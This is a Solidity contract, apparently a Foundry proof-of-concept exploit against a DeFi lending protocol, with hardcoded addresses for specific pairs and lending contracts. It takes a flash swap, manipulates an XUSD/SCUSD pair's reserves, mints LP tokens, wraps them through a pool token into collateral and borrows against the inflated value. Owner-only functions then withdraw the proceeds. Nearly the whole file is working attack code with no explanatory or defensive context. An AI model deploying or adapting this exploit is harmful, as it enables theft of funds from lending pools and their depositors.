//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

interface IPair is IERC20 {
    error NOT_AUTHORIZED();
    error UNSTABLE_RATIO();
    /// @dev safe transfer failed
    error STF();
    error OVERFLOW();
    /// @dev skim disabled
    error SD();
    /// @dev insufficient liquidity minted
    error ILM();
    /// @dev insufficient liquidity burned
    error ILB();
    /// @dev insufficient output amount
    error IOA();
    /// @dev insufficient input amount
    error IIA();
    error IL();
    error IT();
    error K();

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    /// @notice initialize the pool, called only once programatically
    function initialize(address _token0, address _token1, bool _stable) external;

    /// @notice calculate the current reserves of the pool and their last 'seen' timestamp
    /// @return _reserve0 amount of token0 in reserves
    /// @return _reserve1 amount of token1 in reserves
    /// @return _blockTimestampLast the timestamp when the pool was last updated
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    /// @notice mint the pair tokens (LPs)
    /// @param to where to mint the LP tokens to
    /// @return liquidity amount of LP tokens to mint
    function mint(address to) external returns (uint256 liquidity);

    /// @notice burn the pair tokens (LPs)
    /// @param to where to send the underlying
    /// @return amount0 amount of amount0
    /// @return amount1 amount of amount1
    function burn(address to) external returns (uint256 amount0, uint256 amount1);

    /// @notice direct swap through the pool
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    /// @notice force balances to match reserves, can be used to harvest rebases from rebasing tokens or other external factors
    /// @param to where to send the excess tokens to
    function skim(address to) external;

    /// @notice force reserves to match balances, prevents skim excess if skim is enabled
    function sync() external;

    /// @notice set the pair fees contract address
    function setFeeRecipient(address _pairFees) external;

    /// @notice set the feesplit variable
    function setFeeSplit(uint256 _feeSplit) external;

    /// @notice sets the swap fee of the pair
    /// @dev max of 10_000 (10%)
    /// @param _fee the fee
    function setFee(uint256 _fee) external;

    /// @notice 'mint' the fees as LP tokens
    /// @dev this is used for protocol/voter fees
    function mintFee() external;

    /// @notice calculates the amount of tokens to receive post swap
    /// @param amountIn the token amount
    /// @param tokenIn the address of the token
    function getAmountOut(uint256 amountIn, address tokenIn) external view returns (uint256 amountOut);

    /// @notice returns various metadata about the pair
    function metadata()
        external
        view
        returns (
            uint256 _decimals0,
            uint256 _decimals1,
            uint256 _reserve0,
            uint256 _reserve1,
            bool _stable,
            address _token0,
            address _token1
        );

    /// @notice returns the feeSplit of the pair
    function feeSplit() external view returns (uint256);

    /// @notice returns the fee of the pair
    function fee() external view returns (uint256);

    /// @notice returns the feeRecipient of the pair
    function feeRecipient() external view returns (address);
}

interface IPairCallee {
    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPoolToken is IERC20 {
    function mint(address minter) external returns (uint256 mintTokens);
}

interface ICollateral is IPoolToken {
    function getPrices() external returns (uint256 price0, uint256 price1);
    function getReserves() external returns (uint112 reserve0, uint112 reserve1);
    function exchangeRate() external returns (uint256);
}

interface IBorrowable is IPoolToken {
    function borrow(address borrower, address receiver, uint256 borrowAmount, bytes calldata data) external;
}

contract Bot is Ownable, IPairCallee {
    ERC20 private constant AUSDC = ERC20(0x578Ee1ca3a8E1b54554Da1Bf7C583506C4CD11c6);
    ERC20 private constant XUSD = ERC20(0x6202B9f02E30E5e1c62Cc01E4305450E5d83b926);
    ERC20 private constant SCUSD = ERC20(0xd4aA386bfCEEeDd9De0875B3BA07f51808592e22);

    IPair private constant AUSDC_XUSD_PAIR = IPair(0xFEAd02Fb16eC3b2F6318dcA230198db73E99428C);
    IPair private constant XUSD_SCUSD_PAIR = IPair(0x61FC1C551d5Ee8622104dd10Daa91A4cb232A397);

    IPoolToken private constant EQUALIZER = IPoolToken(0xc045e6283517c4b05424414FEABE814786Ae633a);
    ICollateral private constant COLLATERAL = ICollateral(0x259f547E6C810e02C18EB2c9C8F1f5b20EfedB3A);
    IBorrowable private constant BORROWABLE = IBorrowable(0xe5fda1059328F20ca404804c6a08726C1630b1cc);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function hook(address, uint256, uint256 amount1, bytes calldata data) external {
        (uint256 liquidityAmount, uint256 borrowAmount) = abi.decode(data, (uint256, uint256));

        uint256 xusdAmount = liquidityAmount;
        uint256 scusdAmount = XUSD_SCUSD_PAIR.getAmountOut(xusdAmount, address(XUSD));
        XUSD.transfer(address(XUSD_SCUSD_PAIR), xusdAmount);
        XUSD_SCUSD_PAIR.swap(0, scusdAmount, address(this), new bytes(0));

        console.log("Step 1");

        (uint256 xusdReserve, uint256 scusdReserve,) = XUSD_SCUSD_PAIR.getReserves();
        scusdAmount = SCUSD.balanceOf(address(this));
        xusdAmount = scusdAmount * xusdReserve / scusdReserve;

        XUSD.transfer(address(XUSD_SCUSD_PAIR), xusdAmount);
        SCUSD.transfer(address(XUSD_SCUSD_PAIR), scusdAmount);
        uint256 mintTokens = XUSD_SCUSD_PAIR.mint(address(this));

        console.log("Minted XUSD_SCUSD_PAIR =>", mintTokens);

        console.log("Step 2");

        (uint256 reserve0, uint256 reserve1) = COLLATERAL.getReserves();
        console.log("Before reserve0 =>", reserve0);
        console.log("Before reserve1 =>", reserve1);

        xusdAmount = XUSD.balanceOf(address(this));
        scusdAmount = XUSD_SCUSD_PAIR.getAmountOut(xusdAmount, address(XUSD));

        console.log("XUSD amount =>", xusdAmount);
        console.log("SCUSD amount =>", scusdAmount);

        XUSD.transfer(address(XUSD_SCUSD_PAIR), xusdAmount);
        XUSD_SCUSD_PAIR.swap(0, scusdAmount, address(this), new bytes(0));

        (reserve0, reserve1) = COLLATERAL.getReserves();
        console.log("After reserve0 =>", reserve0);
        console.log("After reserve1 =>", reserve1);

        console.log("Step 3");

        XUSD_SCUSD_PAIR.transfer(address(EQUALIZER), XUSD_SCUSD_PAIR.balanceOf(address(this)));

        console.log("Step 4");

        mintTokens = EQUALIZER.mint(address(this));

        console.log("Minted EQUALIZER =>", mintTokens);

        console.log("Step 5");

        EQUALIZER.transfer(address(COLLATERAL), mintTokens);

        console.log("Step 6");

        mintTokens = COLLATERAL.mint(address(this));

        console.log("Minted collateral tokens =>", mintTokens);
        console.log("Collateral balance =>", COLLATERAL.balanceOf(address(this)));
        uint256 collateralAmount = COLLATERAL.balanceOf(address(this)) * COLLATERAL.exchangeRate() / 1 ether;
        console.log("Collateral amount =>", collateralAmount);

        console.log("Step 7");

        BORROWABLE.borrow(address(this), address(this), borrowAmount, new bytes(0));
    }

    function main(uint256 flashLoanAmount, uint256 liquidityAmount, uint256 borrowAmount) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 1e6;
        liquidityAmount = liquidityAmount * 1e6;
        borrowAmount = borrowAmount * 1e6;

        bytes memory params = abi.encode(liquidityAmount, borrowAmount);

        AUSDC_XUSD_PAIR.swap(0, flashLoanAmount, address(this), params);
    }
}
